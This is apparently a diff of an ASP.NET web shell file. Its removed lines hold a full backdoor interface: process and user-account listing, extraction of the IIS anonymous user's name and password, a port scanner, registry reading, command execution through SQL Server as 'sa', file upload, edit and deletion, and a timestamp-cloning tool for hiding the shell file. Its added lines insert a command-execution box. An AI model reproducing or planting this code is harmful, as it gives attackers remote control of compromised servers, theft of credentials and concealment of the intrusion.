-    <asp:Label ID="resultcmdwsh" runat="server" style="color: #0000FF"/>      
-    </p>
-</form>
-<%
-	case "pro1"
-%>
-<form runat="server">
-	<p align=center>[ List processes from server ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-	<table align=center>
-		<tr>
-			<td>
-			<% 
-				Try
-				output_wmi_function_data("Win32_Process","ProcessId,Name,WorkingSetSize,HandleCount")
-				Catch
-				rw("This function is disabled by server")
-				End Try
-			%>
-			</td>
-		</tr>
-	</table>
-</form>
-<%
-	case "pro2"
-%>
-<form runat="server">
-	<p align=center>[ List processes from server ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-	<table align=center width='80%'>
-		<tr>
-			<td>
-			<% 
-				Dim htmlbengin As String = "<table width='80%' align=center border=0><tr align=center><td width='20%'><b>ID</b></td><td align=left width='20%'><b>Process</b></td><td align=left width='20%'><b>MemorySize</b></td><td align=center width='10%'><b>Threads</b></td></tr>"
-			      Dim prostr As String = ""
-			      Dim htmlend As String = "</tr></table>"
-			      Try
-			            Dim mypro As Process() = Process.GetProcesses()
-			            For Each p As Process In mypro
-			                  prostr += "<tr><td align=center>" + p.Id.ToString() + "</td>"
-			                  prostr += "<td align=left>" + p.ProcessName.ToString() + "</td>"
-			                  prostr += "<td align=left>" + p.WorkingSet.ToString() + "</td>"
-			                  prostr += "<td align=center>" + p.Threads.Count.ToString() + "</td>"
-			            Next
-			      Catch ex As Exception
-			            Response.write(ex.Message)
-			      End Try
-			      Response.write(htmlbengin + prostr + htmlend)
-			%>
-			</td>
-		</tr>
-	</table>
-</form>
-<%
-	case "user"
-%>
-<form runat="server">
-	<p align=center>[ List User Accounts ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-	<table align=center>
-		<tr>
-			<td>
-			<% 
-				dim WMI_function = "Win32_UserAccount"		
-				dim Fields_to_load = "Name,Domain,FullName,Description,PasswordRequired,SID"
-				dim fail_description = " Access to " + WMI_function + " is protected"
-				Try
-				output_wmi_function_data(WMI_function,Fields_to_load)
-				Catch
-				rw(fail_description)
-				End Try
-			%>
-			</td>
-		</tr>
-	</table>
-</form>
-<%
-	case "reg"
-%>
-<form runat="server">
-	<p align=center>[ Registry ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-	<table align=center>
-		<tr>
-			<td>
-			<% 
-				dim WMI_function = "Win32_Registry"		
-				dim Fields_to_load = "Caption,CurrentSize,Description,InstallDate,Name,Status"
-				dim fail_description = " Access to " + WMI_function + " is protected"
-				Try
-				output_wmi_function_data(WMI_function,Fields_to_load)
-				Catch
-				rw(fail_description)
-				End Try
-			%>
-			</td>
-		</tr>
-	</table>
-</form>
-<%
-	case "applog"
-%>
-<form runat="server">
-	<p align=center>[ List Application Event Log Entries ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-	<table align=center>
-		<tr>
-			<td>
-			<% 
-				dim WMI_function = "Win32_NTLogEvent where Logfile='Application'"		
-				dim Fields_to_load = "Logfile,Message,type"
-				dim fail_description = " Access to " + WMI_function + " is protected"
-				Try
-				output_wmi_function_data_instances(WMI_function,Fields_to_load,2000)
-				Catch
-				rw(fail_description)
-				End Try
-			%>
-			</td>
-		</tr>
-	</table>
-</form>
-<%
-	case "syslog"
-%>
-<form runat="server">
-	<p align=center>[ List System Event Log Entries ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-	<table align=center>
-		<tr>
-			<td>
-			<% 
-				dim WMI_function = "Win32_NTLogEvent where Logfile='System'"		
-				dim Fields_to_load = "Logfile,Message,type"
-				dim fail_description = " Access to " + WMI_function + " is protected"
-				
-				Try
-				output_wmi_function_data_instances(WMI_function,Fields_to_load,2000)
-				Catch
-				rw("This function is disabled by server")
-				End Try
-			%>
-			</td>
-		</tr>
-	</table>
-</form>
-<%
-	case "auser"
-%>
-<form runat="server">
-	<p align=center>[ IIS List Anonymous' User details ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-	<table align=center>
-		<tr>
-			<td>
-			<% 
-				Try
-				IIS_list_Anon_Name_Pass
-				Catch
-				rw("This function is disabled by server")
-				End Try
-			%>
-			</td>
-		</tr>
-	</table>
-</form>
-<%
-	case "scan"
-%>
-	<form runat="server">
-    <p>[ ASP.NET Port Scanner ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-    <div>
-    	C# coded by Hackwol & Lenk, VB coded by kikicoco (19/08/2008)<br /><br />
-        Start IP :&nbsp;&nbsp;<asp:TextBox ID="txtStartIP" runat="server" Width="177px">127.0.0.1</asp:TextBox>
-        &nbsp;&nbsp; &nbsp; --- &nbsp;End Ip : &nbsp;<asp:TextBox ID="txtEndIP" runat="server" Width="185px">127.0.0.1</asp:TextBox>&nbsp;
-        <br />
-        Ports &nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;<asp:TextBox ID="txtPorts" runat="server" Width="473px">21,25,80,1433,3306,3389</asp:TextBox><br />
-        <br />
-        <asp:Button ID="btnScan" runat="server" Text="Scan" Width="60px" Font-Bold="True" ForeColor="MediumBlue" BorderStyle="Solid" OnClick="btnScan_Click" />
-        &nbsp;&nbsp;
-        <asp:Button ID="btnReset" runat="server" Text="Reset" Width="60px" Font-Bold="True" ForeColor="MediumBlue" BorderStyle="Solid" OnClick="btnReset_Click" /><br />
-        <br />
-        <asp:Label ID="Label1" runat="server" Text="Result:" Visible="False" Width="70px"></asp:Label><br />
-        <asp:ListBox ID="lstRet" runat="server" BackColor="Black" ForeColor="#00C000" Height="251px"
-            Width="527px" Visible="False"></asp:ListBox>
-        <hr align=left style="width: 526px" />
-        <br />
-       </div>
-    </form>
-<%
-case "iisspy"
-%>
-	<p align=center>[ IIS Spy ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-	<% 
-				Try
-				Response.write(IISSpy())
-				Catch
-				rw("This function is disabled by server")
-				End Try
-	%>
-<%
-case "sqltool"
-%>
-	<p align=center>[ SQL Tool ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-	<% 
-				Try
-				
-				Catch
-				rw("This function is disabled by server")
-				End Try
-	%>
-<%
-case "regshell"
-%>
-	<form runat="server">
-	<p align=center >[ Registry Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-  	Key:&nbsp;&nbsp;
-	<asp:TextBox ID="txtRegKey" runat="server" style="width: 595px; border: 1px solid #084B8E">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName</asp:TextBox><br><br>
-	Value:
-	<asp:TextBox ID="txtRegValue" runat="server" style="border: 1px solid #084B8E">ComputerName</asp:TextBox>&nbsp;&nbsp;
-  	<asp:Button ID="btnReadReg" runat="server" Text="Run" OnClick="RegistryRead" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
-  	<p>
-    <asp:Label ID="lblresultReg" runat="server" style="color: red"/>      
-    </p>
-	</form>
-<%
-	case "sqlman"
-%>
-<form runat="server">
-  <p>[ MSSQL Query ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-  <p> Execute query with SQLServer account(<span class="style3">Notice: only click "Run" to run</span>)</p>
-  <p>Host:
-    <asp:TextBox ID="txtHost" runat="server" Width="300" class="TextBox" Text="127.0.0.1"/></p>
-  <p>
-  SQL Name:
-    <asp:TextBox ID="txtSqlName" runat="server" Width="50" class="TextBox" Text='sa'/>
-  SQL Password:
-  <asp:TextBox ID="txtSqlPass" runat="server" Width="80" class="TextBox"/>
-  </p>
-  Command:
-  <asp:TextBox ID="txtSqlcmd" runat="server" Width="500" class="TextBox" TextMode="MultiLine" Rows="6"/></br>
-  <asp:Button ID="btnButtonSQL" runat="server" Text="Run" OnClick="RunSQLQUERY" class="buttom" Width="100"/>  
-  <p>
-   <asp:Label ID="lblresultSQL" runat="server" style="style2"/>      </p>
-</form>
-<%
-	case "sqlrootkit"
-%>
-<form runat="server">
-  <p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-  <p> Execute command with SQLServer account(<span class="style3">Notice: only click "Run" to run</span>)</p>
-  <p>Host:
-    <asp:TextBox ID="ip" runat="server" Width="300" class="TextBox" Text="127.0.0.1"/></p>
-  <p>
-  SQL Name:
-    <asp:TextBox ID="SqlName" runat="server" Width="50" class="TextBox" Text='sa'/>
-  SQL Password:
-  <asp:TextBox ID="SqlPass" runat="server" Width="80" class="TextBox"/>
-  </p>
-  Command:
-  <asp:TextBox ID="Sqlcmd" runat="server" Width="300" class="TextBox"/>
-  <asp:Button ID="ButtonSQL" runat="server" Text="Run" OnClick="RunSQLCMD" class="buttom"/>  
-  <p>
-   <asp:Label ID="resultSQL" runat="server" style="style2"/>      </p>
-</form>
-<%
-	case "del"
-		dim a as string
-		a=request.QueryString("src")
-		call existdir(a)
-		call del(a)  
-		response.Write("<script>alert(""Delete " & replace(a,"\","\\") & " Success!"");location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(a)) &"'</script>")
-	case "copy"
-		call existdir(request.QueryString("src"))
-		session("cutboard")="" & request.QueryString("src")
-		response.Write("<script>alert('File info have add the cutboard, go to target directory click paste!');location.href='JavaScript:self.close()';</script>")
-	case "cut"
-		call existdir(request.QueryString("src"))
-		session("cutboard")="" & request.QueryString("src")
-		response.Write("<script>alert('File info have add the cutboard, go to target directory click paste!');location.href='JavaScript:self.close()';</script>")
-	case "paste"
-		dim ow as integer
-		if request.Form("OverWrite")<>"" then ow=1
-		if request.Form("Cancel")<>"" then ow=2
-		url=request.QueryString("src")
-		call existdir(url)
-		dim d as string
-		d=session("cutboard")
-		if left(d,1)="" then
-			TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
-			TEMP2=url & replace(path.getfilename(d),"","")
-			if right(d,1)="\" then   
-				call xexistdir(TEMP1,ow)
-				directory.move(replace(d,"",""),TEMP1 & "\")  
-				response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
-			else
-				call xexistdir(TEMP2,ow)
-				file.move(replace(d,"",""),TEMP2)
-				response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
-			end if
-		else
-			TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
-			TEMP2=url & path.getfilename(replace(d,"",""))
-			if right(d,1)="\" then 
-				call xexistdir(TEMP1,ow)
-				directory.createdirectory(TEMP1)
-				call copydir(replace(d,"",""),TEMP1 & "\")
-				response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
-			else
-				call xexistdir(TEMP2,ow)
-				file.copy(replace(d,"",""),TEMP2)
-				response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
-			end if
-		end if
-	case "upfile"
-		url=request.QueryString("src")
-%>
-<form name="UpFileForm" enctype="multipart/form-data" method="post" action="?src=<%=server.UrlEncode(url)%>" runat="server"  onSubmit="return checkname();">
- You will upload file to this directory : <span class="style3"><%=url%></span><br>
- Please choose file from your computer :
- <input name="upfile" type="file" class="TextBox" id="UpFile" runat="server">
-    <input type="submit" id="UpFileSubit" value="Upload" runat="server" onserverclick="UpLoad" class="buttom">
-</form>
-<a href="javascript:history.back(1);" style="color:#FF0000">Go Back </a>
-<%
-	case "new"
-		url=request.QueryString("src")
-%>
-<form runat="server">
-  <%=url%><br>
-  Name:
-  <asp:TextBox ID="NewName" TextMode="SingleLine" runat="server" class="TextBox"/>
-  <br>
-  <asp:RadioButton ID="NewFile" Text="File" runat="server" GroupName="New" Checked="true"/>
-  <asp:RadioButton ID="NewDirectory" Text="Directory" runat="server"  GroupName="New"/> 
-  <br>
-  <asp:Button ID="NewButton" Text="Submit" runat="server" CssClass="buttom"  OnClick="NewFD"/>  
-  <input name="Src" type="hidden" value="<%=url%>">
-</form>
-<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
-<%
-	case "edit"
-		dim b as string
-		b=request.QueryString("src")
-		call existdir(b)
-		dim myread as new streamreader(b,encoding.default)
-		filepath.text=b
-		content.text=myread.readtoend
-%>
-<form runat="server">
-  <table width="100%"  border="1" align="center">
-    <tr>      <td width="11%">Path</td>
-      <td width="89%">
-      <asp:TextBox CssClass="TextBox" ID="filepath" runat="server" Width="300"/>
-      *</td>
-    </tr>
-    <tr>
-      <td>Content</td> 
-      <td> <asp:TextBox ID="content" Rows="25" Columns="100" TextMode="MultiLine" runat="server" CssClass="TextBox"/></td>
-    </tr>
-    <tr>
-      <td></td>
-      <td> <asp:Button ID="a" Text="Sumbit" runat="server" OnClick="Editor" CssClass="buttom"/>         
-      </td>
-    </tr>
-  </table>
-</form>
-<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
-<%
-  		myread.close
-	case "rename"
-		url=request.QueryString("src")
-		if request.Form("name")="" then
-	%>
-<form name="formRn" method="post" action="?action=rename&src=<%=server.UrlEncode(request.QueryString("src"))%>" onSubmit="return checkname();">
-  <p>You will rename <span class="style3"><%=request.QueryString("src")%></span>to: <%=getparentdir(request.QueryString("src"))%>
-    <input type="text" name="name" class="TextBox">
-    <input type="submit" name="Submit3" value="Submit" class="buttom">
-</p>
-</form>
-<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
-<script language="javascript">
-function checkname()
-{
-if(formRn.name.value==""){alert("You shall input filename :(");return false}
-}
-</script>
-  <%
-		else
-			if Rename() then
-				response.Write("<script>alert('Rename " & replace(url,"\","\\") & " to " & replace(Getparentdir(url) & request.Form("name"),"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
-			else
-				response.Write("<script>alert('Exist the same name file , rename fail :(');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
-			end if
-		end if
-	case "samename"
-		url=request.QueryString("src")
-%>
-<form name="form1" method="post" action="?action=paste&src=<%=server.UrlEncode(url)%>">
-<p class="style3">Exist the same name file , can you overwrite ?(If you click &quot; no&quot; , it will auto add a number as prefix)</p>
-  <input name="OverWrite" type="submit" id="OverWrite" value="Yes" class="buttom">
-<input name="Cancel" type="submit" id="Cancel" value="No" class="buttom">
-</form>
-<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
-   <%
-    case "clonetime"
-		time1.Text=request.QueryString("src")&"kshell.aspx"
-		time2.Text=request.QueryString("src")
-	%>
-<form runat="server">
-  <p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:history.back(1);">Back</a></i> </p>
-  <p>A tool that it copy the file or directory's time to another file or directory </p>
-  <p>Rework File or Dir:
-    <asp:TextBox CssClass="TextBox" ID="time1" runat="server" Width="300"/></p>
-  <p>Copied File or Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-    <asp:TextBox CssClass="TextBox" ID="time2" runat="server" Width="300"/></p>
-<asp:Button ID="ButtonClone" Text="Submit" runat="server" CssClass="buttom" OnClick="CloneTime"/>
-</form>
-<p>
-  <%
-	case "logout"
-   		session.Abandon()
-		response.Write("<script>alert(' Goodbye !');location.href='" & request.ServerVariables("URL") & "';</sc" & "ript>")
-	end select
-end if
-Catch error_x
-	response.Write("<font color=""red""><br>Wrong: </font>"&error_x.Message)
-End Try
-%>
-</p>
-</p>
-<hr>
-<script language="javascript">
-function closewindow()
-{self.close();}
-</script>
+</div>
+<div class="hidden" id="xnewchild" runat="server">
+</div>
+<div class="bottomwrapper">
+<div class="cmdbox" id="cmdbox" runat="server">
+<form action="?" method="get">
+<input type="hidden" name="dir" id="dir" value=""  runat="server" />
+<table style="width:100%;"><tr>
+<td style="width:88%;"><input type="text" id="cmd" name="cmd" value="" style="width:100%;" runat="server" /></td>
+<td style="width:10%;"><input type="submit" class="btn" name="btnCommand" style="width:120px;" value="Execute" /></td></tr></table>
+</form></div><div class="result" id="resultbox" runat="server"></div></div></div></div></div>
 </body>
 </html>
